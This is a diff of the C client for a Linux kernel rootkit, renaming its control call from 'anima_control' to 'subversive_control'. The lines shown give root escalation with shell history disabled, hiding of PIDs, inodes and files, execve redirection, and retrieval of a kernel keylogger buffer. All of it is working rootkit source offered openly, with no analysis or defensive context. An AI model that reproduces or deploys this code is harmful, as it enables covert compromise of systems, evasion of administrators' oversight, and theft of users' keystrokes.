@@ -5,10 +5,10 @@
 #include <unistd.h>
 #include <sys/stat.h>
 
-#include <anima/anima_ctl.h>
-#include "anima_api.h"
+#include <subversive/subversive_ctl.h>
+#include "subversive_api.h"
 
-long anima_control(long mode, struct rk_args *args)
+long subversive_control(long mode, struct rk_args *args)
 {
 	struct rk_args default_args;
 
@@ -28,7 +28,7 @@ void root_shell(void)
 	char *env[] = { "BASH_HISTORY=/dev/null", "HISTORY=/dev/null",
 			"history=/dev/null" };
 
-	anima_control(GET_ROOT, NULL);
+	subversive_control(GET_ROOT, NULL);
 	execve(argv[0], argv, env);
 }
 
@@ -47,7 +47,7 @@ void hide_inode(long ino)
 	struct rk_args args;
 
 	args.param1 = ino;
-	anima_control(SYSCALL_HIDE_INODE, &args);
+	subversive_control(SYSCALL_HIDE_INODE, &args);
 }
 
 void unhide_inode(long ino)
@@ -55,7 +55,7 @@ void unhide_inode(long ino)
 	struct rk_args args;
 
 	args.param1 = ino;
-	anima_control(SYSCALL_UNHIDE_INODE, &args);
+	subversive_control(SYSCALL_UNHIDE_INODE, &args);
 }
 
 void hide_file(const char *path)
@@ -90,7 +90,7 @@ void hide_pid(pid_t pid)
 	char proc_path[64];
 
 	args.param1 = pid;
-	anima_control(SYSCALL_HIDE_PID, &args);
+	subversive_control(SYSCALL_HIDE_PID, &args);
 
 	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
 	hide_file(proc_path);
@@ -105,7 +105,7 @@ void unhide_pid(pid_t pid)
 	char proc_path[64];
 
 	args.param1 = pid;
-	anima_control(SYSCALL_UNHIDE_PID, &args);
+	subversive_control(SYSCALL_UNHIDE_PID, &args);
 
 	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
 	unhide_file(proc_path);
@@ -119,7 +119,7 @@ void hide_filename(const char *name)
 
 	args.p_param1 = (void *)name;
 	args.param2 = strlen(name);
-	anima_control(VFS_HIDE_FILE, &args);
+	subversive_control(VFS_HIDE_FILE, &args);
 }
 
 void unhide_filename(const char *name)
@@ -128,7 +128,7 @@ void unhide_filename(const char *name)
 
 	args.p_param1 = (void *)name;
 	args.param2 = strlen(name);
-	anima_control(VFS_UNHIDE_FILE, &args);
+	subversive_control(VFS_UNHIDE_FILE, &args);
 }
 
 void redirect_execve(char *path)
@@ -147,7 +147,7 @@ void redirect_execve(char *path)
 	args.param2 = strlen(old_path);
 	args.p_param3 = new_path;
 	args.param4 = strlen(new_path);
-	anima_control(SYSCALL_REDIRECT_EXECVE, &args);
+	subversive_control(SYSCALL_REDIRECT_EXECVE, &args);
 }
 
 void unredirect_execve(char *path)
@@ -156,7 +156,7 @@ void unredirect_execve(char *path)
 
 	args.p_param1 = path;
 	args.param2 = strlen(path);
-	anima_control(SYSCALL_UNREDIRECT_EXECVE, &args);
+	subversive_control(SYSCALL_UNREDIRECT_EXECVE, &args);
 }
 
 void get_keylogger_buf(const char *path)
@@ -176,7 +176,7 @@ void get_keylogger_buf(const char *path)
 
 	args.p_param1 = (char *)keylogger_buf;
 	args.param2 = sizeof(keylogger_buf);
-	ret = anima_control(SYSCALL_GET_KEYLOGGER_BUF, &args);
+	ret = subversive_control(SYSCALL_GET_KEYLOGGER_BUF, &args);
 
 
 	fwrite(keylogger_buf, 1, ret, fp);
